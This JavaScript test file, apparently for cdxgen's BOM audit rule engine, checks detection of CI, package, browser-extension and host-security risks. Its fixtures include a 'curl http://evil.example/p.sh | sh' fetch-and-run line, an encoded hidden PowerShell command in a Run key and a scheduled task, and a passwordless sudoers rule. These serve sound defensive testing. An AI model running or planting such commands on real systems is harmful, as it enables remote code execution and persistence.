import { join } from "node:path";
import { fileURLToPath } from "node:url";

import { PackageURL } from "packageurl-js";
import { assert, describe, it } from "poku";

import {
  auditBom,
  formatAnnotations,
  hasCriticalFindings,
} from "./auditBom.js";
import { evaluateRule, evaluateRules, loadRules } from "./ruleEngine.js";

const __dirname = fileURLToPath(new URL(".", import.meta.url));
const RULES_DIR = join(__dirname, "..", "..", "..", "data", "rules");

function makeBom(components = [], workflows = []) {
  return {
    bomFormat: "CycloneDX",
    specVersion: "1.6",
    serialNumber: "urn:uuid:test-bom",
    metadata: {
      tools: {
        components: [
          {
            type: "application",
            name: "cdxgen",
            version: "11.0.0",
            "bom-ref": "pkg:npm/%40cyclonedx/cdxgen@11.0.0",
          },
        ],
      },
      component: {
        name: "test-project",
        type: "application",
        "bom-ref": "pkg:npm/test-project@1.0.0",
      },
    },
    components,
    formulation: workflows.length ? [{ workflows }] : undefined,
  };
}

function makeComponent(name, version, properties) {
  return {
    type: "library",
    name,
    version,
    purl: `pkg:npm/${name}@${version}`,
    "bom-ref": `pkg:npm/${name}@${version}`,
    properties: properties.map(([k, v]) => ({ name: k, value: v })),
  };
}

function makeChromeExtensionComponent(name, version, properties) {
  const purl = new PackageURL(
    "chrome-extension",
    null,
    name,
    version,
  ).toString();
  return {
    type: "application",
    name,
    version,
    purl,
    "bom-ref": purl,
    properties: properties.map(([k, v]) => ({ name: k, value: v })),
  };
}

describe("loadRules", () => {
  it("should load built-in rules from the data/rules directory", async () => {
    const rules = await loadRules(RULES_DIR);
    assert.ok(rules.length > 0, "Should load at least one rule");
    for (const rule of rules) {
      assert.ok(rule.id, "Each rule must have an id");
      assert.ok(rule.condition, "Each rule must have a condition");
      assert.ok(rule.message, "Each rule must have a message");
      assert.ok(
        ["critical", "high", "medium", "low"].includes(rule.severity),
        `Rule ${rule.id} severity must be valid`,
      );
    }
  });

  it("should return empty array for non-existent directory", async () => {
    const rules = await loadRules("/tmp/non-existent-rules-dir-12345");
    assert.deepStrictEqual(rules, []);
  });

  it("should load rules with all required fields", async () => {
    const rules = await loadRules(RULES_DIR);
    const ciRules = rules.filter((r) => r.category === "ci-permission");
    assert.ok(ciRules.length > 0, "Should have CI permission rules");
    const depRules = rules.filter((r) => r.category === "dependency-source");
    assert.ok(depRules.length > 0, "Should have dependency source rules");
    const intRules = rules.filter((r) => r.category === "package-integrity");
    assert.ok(intRules.length > 0, "Should have package integrity rules");
    const chromeExtensionRules = rules.filter(
      (r) => r.category === "chrome-extension",
    );
    assert.ok(chromeExtensionRules.length > 0, "Should have extension rules");
  });
});

describe("evaluateRule", () => {
  it("should detect unpinned action with write permissions (CI-001)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CI-001");
    assert.ok(rule, "CI-001 rule should exist");

    const bom = makeBom([
      makeComponent("actions/setup-node", "v3", [
        ["cdx:github:action:isShaPinned", "false"],
        ["cdx:github:workflow:hasWritePermissions", "true"],
        ["cdx:github:action:uses", "actions/setup-node@v3"],
        ["cdx:github:action:versionPinningType", "tag"],
      ]),
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should find unpinned action");
    assert.strictEqual(findings[0].ruleId, "CI-001");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should not flag SHA-pinned actions for CI-001", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CI-001");

    const bom = makeBom([
      makeComponent("actions/setup-node", "v3", [
        ["cdx:github:action:isShaPinned", "true"],
        ["cdx:github:workflow:hasWritePermissions", "true"],
        ["cdx:github:action:uses", "actions/setup-node@abc123"],
      ]),
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.strictEqual(
      findings.length,
      0,
      "SHA-pinned action should not trigger",
    );
  });

  it("should detect npm install script from non-registry source (PKG-001)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "PKG-001");
    assert.ok(rule, "PKG-001 rule should exist");

    const bom = makeBom([
      makeComponent("sketchy-pkg", "1.0.0", [
        ["cdx:npm:hasInstallScript", "true"],
        ["cdx:npm:isRegistryDependency", "false"],
      ]),
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect install script risk");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect npm name mismatch (INT-002)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "INT-002");
    assert.ok(rule, "INT-002 rule should exist");

    const bom = makeBom([
      makeComponent("suspicious-pkg", "1.0.0", [
        [
          "cdx:npm:nameMismatchError",
          "Expected 'real-pkg', found 'suspicious-pkg'",
        ],
      ]),
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect name mismatch");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect yanked Ruby gem (INT-004)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "INT-004");
    assert.ok(rule, "INT-004 rule should exist");

    const bom = makeBom([
      {
        type: "library",
        name: "bad-gem",
        version: "0.5.0",
        purl: "pkg:gem/bad-gem@0.5.0",
        "bom-ref": "pkg:gem/bad-gem@0.5.0",
        properties: [{ name: "cdx:gem:yanked", value: "true" }],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect yanked gem");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect broad host access extensions (CHE-001)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CHE-001");
    assert.ok(rule, "CHE-001 rule should exist");
    const bom = makeBom([
      makeChromeExtensionComponent("example-extension", "1.0.0", [
        ["cdx:chrome-extension:permissions", "<all_urls>, storage"],
      ]),
    ]);
    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect broad host access extension");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect web request interception permissions (CHE-002)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CHE-002");
    assert.ok(rule, "CHE-002 rule should exist");
    const bom = makeBom([
      makeChromeExtensionComponent("proxy-extension", "1.0.0", [
        [
          "cdx:chrome-extension:permissions",
          "storage, webRequest, webRequestBlocking",
        ],
      ]),
    ]);
    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect network interception risk");
    assert.strictEqual(findings[0].severity, "critical");
  });

  it("should detect broad host code injection capability (CHE-006)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CHE-006");
    assert.ok(rule, "CHE-006 rule should exist");
    const bom = makeBom([
      makeChromeExtensionComponent("injector-extension", "1.0.0", [
        ["cdx:chrome-extension:hostPermissions", "*://*/*"],
        ["cdx:chrome-extension:capability:codeInjection", "true"],
        ["cdx:chrome-extension:capabilities", "network, codeInjection"],
      ]),
    ]);
    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect code-injection risk");
    assert.strictEqual(findings[0].severity, "critical");
  });

  it("should detect AI-assistant code-injection extensions (CHE-008)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CHE-008");
    assert.ok(rule, "CHE-008 rule should exist");
    const bom = makeBom([
      makeChromeExtensionComponent("ai-assistant-extension", "1.0.0", [
        [
          "cdx:chrome-extension:hostPermissions",
          "https://chat.openai.com/*, https://claude.ai/*",
        ],
        ["cdx:chrome-extension:capability:codeInjection", "true"],
        ["cdx:chrome-extension:capabilities", "network, codeInjection"],
      ]),
    ]);
    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect AI assistant takeover risk");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should return empty findings when no components match", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "CI-001");

    const bom = makeBom([]);
    const findings = await evaluateRule(rule, bom);
    assert.strictEqual(findings.length, 0, "No components means no findings");
  });

  it("should detect unprotected BitLocker drive (OBOM-WIN-001)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-WIN-001");
    assert.ok(rule, "OBOM-WIN-001 rule should exist");

    const bom = makeBom([
      makeComponent("disk-c", "C:", [
        ["cdx:osquery:category", "windows_bitlocker_info"],
        ["protection_status", "0"],
        ["encryption_method", "XTS-AES 128"],
      ]),
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(
      findings.length > 0,
      "Should detect disabled BitLocker protection",
    );
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect suspicious Linux systemd unit path (OBOM-LNX-001)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-LNX-001");
    assert.ok(rule, "OBOM-LNX-001 rule should exist");

    const bom = makeBom([
      {
        type: "data",
        name: "evil.service",
        version: "",
        description: "",
        purl: "pkg:swid/evil-service",
        "bom-ref": "pkg:swid/evil-service",
        properties: [
          { name: "cdx:osquery:category", value: "systemd_units" },
          { name: "fragment_path", value: "/tmp/evil.service" },
          { name: "source_path", value: "/tmp/evil.service" },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect systemd unit from temp path");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect root authorized_keys without restrictions (OBOM-LNX-003)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-LNX-003");
    assert.ok(rule, "OBOM-LNX-003 rule should exist");

    const bom = makeBom([
      {
        type: "data",
        name: "root",
        version: "ssh-rsa",
        description: "",
        purl: "pkg:swid/root-authorized-keys",
        "bom-ref": "pkg:swid/root-authorized-keys",
        properties: [
          { name: "cdx:osquery:category", value: "authorized_keys_snapshot" },
          { name: "key_file", value: "/root/.ssh/authorized_keys" },
          { name: "options", value: "" },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(
      findings.length > 0,
      "Should detect unrestricted root authorized_keys entry",
    );
    assert.strictEqual(findings[0].severity, "medium");
  });

  it("should detect degraded Windows Security Center posture (OBOM-WIN-002)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-WIN-002");
    assert.ok(rule, "OBOM-WIN-002 rule should exist");

    const bom = makeBom([
      makeComponent("Poor", "Poor", [
        ["cdx:osquery:category", "windows_security_center"],
      ]),
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect unhealthy security center");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect suspicious Windows run key command (OBOM-WIN-003)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-WIN-003");
    assert.ok(rule, "OBOM-WIN-003 rule should exist");

    const bom = makeBom([
      {
        type: "data",
        name: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
        version: "",
        description:
          "powershell -enc SQBFAFgAIAAoAEkAbgB2AG8AawBlACkA -w hidden",
        purl: "pkg:swid/windows-run-key-updater",
        "bom-ref": "pkg:swid/windows-run-key-updater",
        properties: [
          { name: "cdx:osquery:category", value: "windows_run_keys" },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect suspicious run key command");
    assert.strictEqual(findings[0].severity, "critical");
  });

  it("should detect weak macOS ALF posture (OBOM-MAC-001)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-MAC-001");
    assert.ok(rule, "OBOM-MAC-001 rule should exist");

    const bom = makeBom([
      makeComponent("alf", "0", [
        ["cdx:osquery:category", "alf"],
        ["stealth_enabled", "0"],
      ]),
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect weak firewall posture");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect launchd temp-path persistence (OBOM-MAC-002)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-MAC-002");
    assert.ok(rule, "OBOM-MAC-002 rule should exist");

    const bom = makeBom([
      {
        type: "data",
        name: "com.bad.agent",
        version: "",
        description: "",
        purl: "pkg:swid/mac-launchd-bad-agent",
        "bom-ref": "pkg:swid/mac-launchd-bad-agent",
        properties: [
          { name: "cdx:osquery:category", value: "launchd_services" },
          { name: "path", value: "/tmp/com.bad.agent.plist" },
          { name: "program", value: "/tmp/bad-agent" },
          { name: "run_at_load", value: "true" },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect suspicious launchd service");
    assert.strictEqual(findings[0].severity, "critical");
  });

  it("should detect risky macOS ALF user path exception (OBOM-MAC-003)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-MAC-003");
    assert.ok(rule, "OBOM-MAC-003 rule should exist");

    const bom = makeBom([
      {
        type: "data",
        name: "/Users/alice/Downloads/remote-control.app",
        version: "1",
        description: "",
        purl: "pkg:swid/mac-alf-exception",
        "bom-ref": "pkg:swid/mac-alf-exception",
        properties: [{ name: "cdx:osquery:category", value: "alf_exceptions" }],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect risky ALF exception path");
    assert.strictEqual(findings[0].severity, "medium");
  });

  it("should detect broad sudoers rule (OBOM-LNX-002)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-LNX-002");
    assert.ok(rule, "OBOM-LNX-002 rule should exist");

    const bom = makeBom([
      {
        type: "data",
        name: "admin-policy",
        version: "",
        description: "admin ALL=(ALL) NOPASSWD:ALL",
        purl: "pkg:swid/admin-policy",
        "bom-ref": "pkg:swid/admin-policy",
        properties: [
          { name: "cdx:osquery:category", value: "sudoers_snapshot" },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect broad sudoers policy");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect ALL=(ALL) ALL sudoers rule (OBOM-LNX-002)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-LNX-002");
    assert.ok(rule, "OBOM-LNX-002 rule should exist");

    const bom = makeBom([
      {
        type: "data",
        name: "legacy-admin-policy",
        version: "",
        description: "admin ALL=(ALL) ALL",
        purl: "pkg:swid/legacy-admin-policy",
        "bom-ref": "pkg:swid/legacy-admin-policy",
        properties: [
          { name: "cdx:osquery:category", value: "sudoers_snapshot" },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(
      findings.length > 0,
      "Should detect ALL=(ALL) ALL sudoers policy",
    );
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect suspicious shell history commands (OBOM-LNX-004)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-LNX-004");
    assert.ok(rule, "OBOM-LNX-004 rule should exist");

    const bom = makeBom([
      {
        type: "data",
        name: "analyst",
        version: "",
        description: "curl http://evil.example/p.sh | sh",
        purl: "pkg:swid/analyst-shell-history",
        "bom-ref": "pkg:swid/analyst-shell-history",
        properties: [
          { name: "cdx:osquery:category", value: "shell_history_snapshot" },
          { name: "history_file", value: "/home/analyst/.bash_history" },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect suspicious shell history");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect exposed docker daemon API (OBOM-LNX-005)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-LNX-005");
    assert.ok(rule, "OBOM-LNX-005 rule should exist");

    const bom = makeBom([
      makeComponent("dockerd", "2375", [
        ["cdx:osquery:category", "listening_ports"],
        ["address", "0.0.0.0"],
        ["port", "2375"],
        ["protocol", "6"],
      ]),
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect exposed docker daemon API");
    assert.strictEqual(findings[0].severity, "critical");
  });

  it("should detect hidden suspicious Windows scheduled task (OBOM-WIN-004)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-WIN-004");
    assert.ok(rule, "OBOM-WIN-004 rule should exist");

    const bom = makeBom([
      {
        type: "data",
        name: "WindowsUpdateTask",
        version: "",
        description: "",
        purl: "pkg:swid/windows-task",
        "bom-ref": "pkg:swid/windows-task",
        properties: [
          { name: "cdx:osquery:category", value: "scheduled_tasks" },
          { name: "enabled", value: "1" },
          { name: "hidden", value: "1" },
          { name: "path", value: "C:\\Users\\Public\\Temp\\u.exe" },
          {
            name: "action",
            value: "powershell -enc SQBFAFgAIAAoAEkAbgB2AG8AawBlACkA",
          },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect suspicious hidden task");
    assert.strictEqual(findings[0].severity, "high");
  });

  it("should detect auto-start service in user-writable path (OBOM-WIN-005)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-WIN-005");
    assert.ok(rule, "OBOM-WIN-005 rule should exist");

    const bom = makeBom([
      {
        type: "data",
        name: "EvilAutoStartService",
        version: "",
        description: "",
        purl: "pkg:swid/windows-service-evil",
        "bom-ref": "pkg:swid/windows-service-evil",
        properties: [
          { name: "cdx:osquery:category", value: "services_snapshot" },
          { name: "start_type", value: "AUTO_START" },
          {
            name: "path",
            value:
              "C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Windows\\evil.exe",
          },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(findings.length > 0, "Should detect auto-start service risk");
    assert.strictEqual(findings[0].severity, "critical");
  });

  it("should detect launchd override disabling Apple service (OBOM-MAC-004)", async () => {
    const rules = await loadRules(RULES_DIR);
    const rule = rules.find((r) => r.id === "OBOM-MAC-004");
    assert.ok(rule, "OBOM-MAC-004 rule should exist");

    const bom = makeBom([
      {
        type: "data",
        name: "com.apple.some-security-service",
        version: "",
        description: "",
        purl: "pkg:swid/launchd-override",
        "bom-ref": "pkg:swid/launchd-override",
        properties: [
          { name: "cdx:osquery:category", value: "launchd_overrides" },
          { name: "label", value: "com.apple.some-security-service" },
          { name: "key", value: "Disabled" },
          { name: "value", value: "1" },
          { name: "uid", value: "0" },
        ],
      },
    ]);

    const findings = await evaluateRule(rule, bom);
    assert.ok(
      findings.length > 0,
      "Should detect disabled Apple launchd label",
    );
    assert.strictEqual(findings[0].severity, "medium");
  });
});

describe("evaluateRules", () => {
  it("should sort findings by severity (high before medium before low)", async () => {
    const rules = await loadRules(RULES_DIR);
    const bom = makeBom([
      makeComponent("actions/checkout", "v3", [
        ["cdx:github:action:isShaPinned", "false"],
        ["cdx:github:workflow:hasWritePermissions", "true"],
        ["cdx:github:action:uses", "actions/checkout@v3"],
        ["cdx:github:action:versionPinningType", "tag"],
      ]),
      makeComponent("deprecated-go-mod", "1.0.0", [
        ["cdx:go:deprecated", "use other-module instead"],
      ]),
    ]);

    const findings = await evaluateRules(rules, bom);
    if (findings.length >= 2) {
      const severityOrder = { critical: 0, high: 1, medium: 2, low: 3 };
      for (let i = 1; i < findings.length; i++) {
        const prev = severityOrder[findings[i - 1].severity] ?? 4;
        const curr = severityOrder[findings[i].severity] ?? 4;
        assert.ok(
          prev <= curr,
          `Finding ${i - 1} severity (${findings[i - 1].severity}) should be >= severity of finding ${i} (${findings[i].severity})`,
        );
      }
    }
  });
});

describe("auditBom", () => {
  it("should run audit and return findings", async () => {
    const bom = makeBom([
      makeComponent("actions/setup-node", "v3", [
        ["cdx:github:action:isShaPinned", "false"],
        ["cdx:github:workflow:hasWritePermissions", "true"],
        ["cdx:github:action:uses", "actions/setup-node@v3"],
        ["cdx:github:action:versionPinningType", "tag"],
      ]),
    ]);

    const findings = await auditBom(bom, {});
    assert.ok(findings.length > 0, "Should find at least one issue");
  });

  it("should return empty array for null bom", async () => {
    const findings = await auditBom(null, {});
    assert.deepStrictEqual(findings, []);
  });

  it("should filter by category", async () => {
    const bom = makeBom([
      makeComponent("actions/setup-node", "v3", [
        ["cdx:github:action:isShaPinned", "false"],
        ["cdx:github:workflow:hasWritePermissions", "true"],
        ["cdx:github:action:uses", "actions/setup-node@v3"],
        ["cdx:github:action:versionPinningType", "tag"],
      ]),
      makeComponent("sketchy-pkg", "1.0.0", [
        ["cdx:npm:hasInstallScript", "true"],
        ["cdx:npm:isRegistryDependency", "false"],
      ]),
    ]);

    const ciOnly = await auditBom(bom, {
      bomAuditCategories: "ci-permission",
    });
    for (const f of ciOnly) {
      assert.strictEqual(f.category, "ci-permission");
    }
  });

  it("should filter by minimum severity", async () => {
    const bom = makeBom([
      makeComponent("actions/setup-node", "v3", [
        ["cdx:github:action:isShaPinned", "false"],
        ["cdx:github:workflow:hasWritePermissions", "true"],
        ["cdx:github:action:uses", "actions/setup-node@v3"],
        ["cdx:github:action:versionPinningType", "tag"],
      ]),
    ]);

    const highOnly = await auditBom(bom, {
      bomAuditMinSeverity: "high",
    });
    for (const f of highOnly) {
      assert.strictEqual(f.severity, "high");
    }
  });
});

describe("formatAnnotations", () => {
  it("should create CycloneDX annotations from findings", () => {
    const bom = makeBom([]);
    const findings = [
      {
        ruleId: "CI-001",
        name: "Unpinned action",
        severity: "high",
        category: "ci-permission",
        message: "Unpinned GitHub Action detected",
        mitigation: "Pin to SHA",
      },
    ];
    const annotations = formatAnnotations(findings, bom);
    assert.strictEqual(annotations.length, 1);
    assert.ok(
      annotations[0].text.startsWith("Unpinned GitHub Action detected"),
    );
    assert.ok(
      annotations[0].annotator.component,
      "Annotation should have annotator component",
    );
    assert.ok(annotations[0].subjects.includes(bom.serialNumber));
  });

  it("should return empty array when cdxgen tool component is missing", () => {
    const bom = {
      serialNumber: "urn:uuid:test",
      metadata: { tools: { components: [] } },
      components: [],
    };
    const findings = [
      {
        ruleId: "CI-001",
        severity: "high",
        category: "ci-permission",
        message: "test",
      },
    ];
    const annotations = formatAnnotations(findings, bom);
    assert.deepStrictEqual(annotations, []);
  });

  it("should return empty array when metadata.tools is undefined", () => {
    const bom = {
      serialNumber: "urn:uuid:test",
      metadata: {},
      components: [],
    };
    const annotations = formatAnnotations(
      [{ ruleId: "X", severity: "low", category: "test", message: "test" }],
      bom,
    );
    assert.deepStrictEqual(annotations, []);
  });
});

describe("hasCriticalFindings", () => {
  it("should return true when high severity findings exist", () => {
    const findings = [{ severity: "high" }];
    assert.ok(hasCriticalFindings(findings, {}));
  });

  it("should return false when only low severity findings exist", () => {
    const findings = [{ severity: "low" }];
    assert.ok(!hasCriticalFindings(findings, {}));
  });

  it("should use threshold semantics (at or above)", () => {
    const findings = [{ severity: "high" }];
    // medium threshold should catch high findings
    assert.ok(
      hasCriticalFindings(findings, { bomAuditFailSeverity: "medium" }),
    );
    // high threshold should catch high findings
    assert.ok(hasCriticalFindings(findings, { bomAuditFailSeverity: "high" }));
    // critical threshold should NOT catch high findings
    assert.ok(
      !hasCriticalFindings(findings, { bomAuditFailSeverity: "critical" }),
    );
  });

  it("should respect custom fail severity for medium", () => {
    const findings = [{ severity: "medium" }];
    assert.ok(
      hasCriticalFindings(findings, { bomAuditFailSeverity: "medium" }),
    );
    assert.ok(!hasCriticalFindings(findings, { bomAuditFailSeverity: "high" }));
  });

  it("should return false for empty findings", () => {
    assert.ok(!hasCriticalFindings([], {}));
    assert.ok(!hasCriticalFindings(null, {}));
  });
});
